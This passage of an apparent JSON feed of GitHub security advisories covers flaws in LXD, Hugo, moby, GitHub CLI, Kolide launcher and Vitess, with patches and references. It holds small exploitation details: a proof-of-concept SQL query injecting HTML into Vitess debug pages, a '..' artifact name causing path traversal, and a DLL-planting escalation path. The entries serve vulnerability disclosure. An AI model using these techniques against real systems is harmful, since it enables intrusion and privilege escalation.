href=\"https://www.cve.org/CVERecord?id=CVE-2024-6219\">https://www.cve.org/CVERecord?id=CVE-2024-6219</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jpmc-7p9c-4rxf\">https://github.com/advisories/GHSA-jpmc-7p9c-4rxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jpmc-7p9c-4rxf",
            "title": "[github.com/canonical/lxd] lxd has a restricted TLS certificate privilege escalation when in PKI mode",
            "date_modified": "2024-12-09T22:43:15.000Z",
            "date_published": "2024-12-09T22:43:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jpmc-7p9c-4rxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"impact\">Impact</h2>\n<p>Some HTML attributes in Markdown in the internal templates listed below not escaped. Impacted are Hugo users who do not trust their Markdown content files and are using one or more of these templates.</p>\n<ul>\n<li><code>_default/_markup/render-link.html</code> from <code>v0.123.0</code></li>\n<li><code>_default/_markup/render-image.html</code> from <code>v0.123.0</code></li>\n<li><code>_default/_markup/render-table.html</code> from <code>v0.134.0</code></li>\n<li><code>shortcodes/youtube.html</code> from <code>v0.125.0</code></li>\n</ul>\n<h2 id=\"patches\">Patches</h2>\n<p>Patched in v0.139.4.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Replace with user defined templates or disable the internal templates: <a href=\"https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault\">https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault</a></p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://github.com/gohugoio/hugo/releases/tag/v0.139.4\">https://github.com/gohugoio/hugo/releases/tag/v0.139.4</a></li>\n<li><a href=\"https://gohugo.io/about/security/\">https://gohugo.io/about/security/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gohugoio/hugo/security/advisories/GHSA-c2xf-9v2r-r2rx\">https://github.com/gohugoio/hugo/security/advisories/GHSA-c2xf-9v2r-r2rx</a></li>\n<li><a href=\"https://github.com/gohugoio/hugo/commit/54398f8d572c689f9785d59e907fd910a23401b0\">https://github.com/gohugoio/hugo/commit/54398f8d572c689f9785d59e907fd910a23401b0</a></li>\n<li><a href=\"https://github.com/gohugoio/hugo/releases/tag/v0.139.4\">https://github.com/gohugoio/hugo/releases/tag/v0.139.4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55601\">https://nvd.nist.gov/vuln/detail/CVE-2024-55601</a></li>\n<li><a href=\"https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault\">https://gohugo.io/getting-started/configuration-markup/#renderhooksimageenabledefault</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c2xf-9v2r-r2rx\">https://github.com/advisories/GHSA-c2xf-9v2r-r2rx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c2xf-9v2r-r2rx",
            "title": "[github.com/gohugoio/hugo] Hugo does not escape some attributes in internal templates",
            "date_modified": "2024-12-10T15:33:25.000Z",
            "date_published": "2024-12-09T20:44:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c2xf-9v2r-r2rx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>moby v25.0.0 - v26.0.2 is vulnerable to NULL Pointer Dereference via daemon/images/image_history.go.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36620\">https://nvd.nist.gov/vuln/detail/CVE-2024-36620</a></li>\n<li><a href=\"https://github.com/moby/moby/commit/ab570ab3d62038b3d26f96a9bb585d0b6095b9b4\">https://github.com/moby/moby/commit/ab570ab3d62038b3d26f96a9bb585d0b6095b9b4</a></li>\n<li><a href=\"https://gist.github.com/1047524396/f08816669701ab478a265a811d2c89b2\">https://gist.github.com/1047524396/f08816669701ab478a265a811d2c89b2</a></li>\n<li><a href=\"https://github.com/moby/moby/blob/v26.0.2/daemon/images/image_history.go#L48\">https://github.com/moby/moby/blob/v26.0.2/daemon/images/image_history.go#L48</a></li>\n<li><a href=\"https://pkg.go.dev/vuln/GO-2024-3311\">https://pkg.go.dev/vuln/GO-2024-3311</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q59j-vv4j-v33c\">https://github.com/advisories/GHSA-q59j-vv4j-v33c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q59j-vv4j-v33c",
            "title": "[github.com/moby/moby] NULL Pointer Dereference on moby image history",
            "date_modified": "2024-12-09T21:53:38.000Z",
            "date_published": "2024-11-29T18:34:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q59j-vv4j-v33c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A security vulnerability has been identified in GitHub CLI that could create or overwrite files in unintended directories when users download a malicious GitHub Actions workflow artifact through <code>gh run download</code>. </p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability stems from a GitHub Actions workflow artifact named <code>..</code> when downloaded using <code>gh run download</code>.  The artifact name and <code>--dir</code> flag are used to determine the artifact’s download path.  When the artifact is named <code>..</code>, the resulting files within the artifact are extracted exactly 1 directory higher than the specified <code>--dir</code> flag value.</p>\n<p>In <code>2.63.1</code>, <code>gh run download</code> will not download artifacts named <code>..</code> and <code>.</code> and instead exit with the following error message:</p>\n<pre><code>error downloading ..: would result in path traversal\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation heightens the risk of local path traversal attack vectors exactly 1 directory higher than intended.</p>\n<h3 id=\"remediation-and-mitigation\">Remediation and Mitigation</h3>\n<ol>\n<li>Upgrade <code>gh</code> to <code>2.63.1</code></li>\n<li>Implement additional validation to ensure artifact filenames do not contain potentially dangerous patterns, such as <code>..</code>, to prevent path traversal risks.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-2m9h-r57g-45pj\">https://github.com/cli/cli/security/advisories/GHSA-2m9h-r57g-45pj</a></li>\n<li><a href=\"https://github.com/cli/cli/commit/1136764c369aaf0cae4ec2ee09dc35d871076932\">https://github.com/cli/cli/commit/1136764c369aaf0cae4ec2ee09dc35d871076932</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54132\">https://nvd.nist.gov/vuln/detail/CVE-2024-54132</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2m9h-r57g-45pj\">https://github.com/advisories/GHSA-2m9h-r57g-45pj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2m9h-r57g-45pj",
            "title": "[github.com/cli/cli] Downloading malicious GitHub Actions workflow artifact results in path traversal vulnerability",
            "date_modified": "2024-12-04T22:17:32.000Z",
            "date_published": "2024-12-04T15:32:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2m9h-r57g-45pj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A security vulnerability has been identified in GitHub CLI that could create or overwrite files in unintended directories when users download a malicious GitHub Actions workflow artifact through <code>gh run download</code>. </p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability stems from a GitHub Actions workflow artifact named <code>..</code> when downloaded using <code>gh run download</code>.  The artifact name and <code>--dir</code> flag are used to determine the artifact’s download path.  When the artifact is named <code>..</code>, the resulting files within the artifact are extracted exactly 1 directory higher than the specified <code>--dir</code> flag value.</p>\n<p>In <code>2.63.1</code>, <code>gh run download</code> will not download artifacts named <code>..</code> and <code>.</code> and instead exit with the following error message:</p>\n<pre><code>error downloading ..: would result in path traversal\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Successful exploitation heightens the risk of local path traversal attack vectors exactly 1 directory higher than intended.</p>\n<h3 id=\"remediation-and-mitigation\">Remediation and Mitigation</h3>\n<ol>\n<li>Upgrade <code>gh</code> to <code>2.63.1</code></li>\n<li>Implement additional validation to ensure artifact filenames do not contain potentially dangerous patterns, such as <code>..</code>, to prevent path traversal risks.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cli/cli/security/advisories/GHSA-2m9h-r57g-45pj\">https://github.com/cli/cli/security/advisories/GHSA-2m9h-r57g-45pj</a></li>\n<li><a href=\"https://github.com/cli/cli/commit/1136764c369aaf0cae4ec2ee09dc35d871076932\">https://github.com/cli/cli/commit/1136764c369aaf0cae4ec2ee09dc35d871076932</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-54132\">https://nvd.nist.gov/vuln/detail/CVE-2024-54132</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2m9h-r57g-45pj\">https://github.com/advisories/GHSA-2m9h-r57g-45pj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2m9h-r57g-45pj",
            "title": "[github.com/cli/cli/v2] Downloading malicious GitHub Actions workflow artifact results in path traversal vulnerability",
            "date_modified": "2024-12-04T22:17:32.000Z",
            "date_published": "2024-12-04T15:32:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2m9h-r57g-45pj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An implementation bug in the Kolide Agent (known as <code>launcher</code>) allows for local privilege escalation to the SYSTEM user on Windows 10 and 11. Impacted versions include versions &gt;= 1.5.3 and the fix has been released in 1.12.3. </p>\n<p>The bug was introduced in version 1.5.3 when launcher started storing upgraded binaries in the ProgramData directory (#1510). This move to the new directory meant the launcher root directory inherited default permissions that are not as strict as the previous location. These incorrect default permissions in conjunction with an omitted SystemDrive environmental variable (when launcher starts osqueryd), allows a malicious actor with access to the local Windows device to successfully place an arbitrary DLL into the osqueryd process's search path. Under some circumstances, this DLL will be executed when osqueryd performs a WMI query. This combination of events could then allow the attacker to escalate their privileges to SYSTEM.</p>\n<p>This issue was found by Bryan Alexander of Atredis Partners and responsibly reported through the Kolide bug bounty program. Kolide made the appropriate changes and released a fix in version 1.12.3 of the <code>launcher</code> package.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kolide/launcher/security/advisories/GHSA-66q9-2rvx-qfj5\">https://github.com/kolide/launcher/security/advisories/GHSA-66q9-2rvx-qfj5</a></li>\n<li><a href=\"https://github.com/kolide/launcher/pull/1510\">https://github.com/kolide/launcher/pull/1510</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-66q9-2rvx-qfj5\">https://github.com/advisories/GHSA-66q9-2rvx-qfj5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-66q9-2rvx-qfj5",
            "title": "[github.com/kolide/launcher] Kolide Agent Privilege Escalation (Windows, Versions >= 1.5.3, < 1.12.3)",
            "date_modified": "2024-12-03T20:56:59.000Z",
            "date_published": "2024-12-03T20:56:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-66q9-2rvx-qfj5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>/debug/querylogz</code> and <code>/debug/env</code> pages for <code>vtgate</code> and <code>vttablet</code> do not properly escape user input. The result is that queries executed by Vitess can write HTML into the monitoring page at will.</p>\n<h3 id=\"details\">Details</h3>\n<p>These pages are rendered using <code>text/template</code> instead of rendering with a proper HTML templating engine.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Execute any query where part of it is HTML markup, for example as part of a string. To make it easier to observe you might want to make sure the query takes a few seconds to complete, giving you time to refresh the status page. </p>\n<p>Example query that can trigger the issue:</p>\n<pre><code class=\"language-sql\">UPDATE users\nSET\n    email = CONCAT(\"&lt;img src=https://cataas.com/cat/says/oops&gt;\", users.idUser, \"@xxx\")\nWHERE\n    email NOT LIKE '%xxx%' AND email != \"demo@xxx.com\"\n</code></pre>\n<p>Result: </p>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/c583816b-157c-474e-bbed-152b3dc0372f\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Anyone looking at the Vitess status page is affected. This would normally be owners / administrators of the Vitess cluster.</p>\n<p>Anyone that can influence what text show up in queries can trigger it. This would normally be pretty much everybody interacting with a system that uses Vitess as a backend.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitessio/vitess/security/advisories/GHSA-7mwh-q3xm-qh6p\">https://github.com/vitessio/vitess/security/advisories/GHSA-7mwh-q3xm-qh6p</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-53257\">https://nvd.nist.gov/vuln/detail/CVE-2024-53257</a></li>\n<li><a href=\"https://github.com/vitessio/vitess/commit/2b71d1b5f8ca676beeab2875525003cd45096217\">https://github.com/vitessio/vitess/commit/2b71d1b5f8ca676beeab2875525003cd45096217</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mwh-q3xm-qh6p\">https://github.com/advisories/GHSA-7mwh-q3xm-qh6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mwh-q3xm-qh6p",
            "title": "[vitess.io/vitess] Vitess allows HTML injection in /debug/querylogz & /debug/env",
            "date_modified": "2024-12-03T18:43:35.000Z",
            "date_published": "2024-12-03T18:43:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mwh-q3xm-qh6p"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}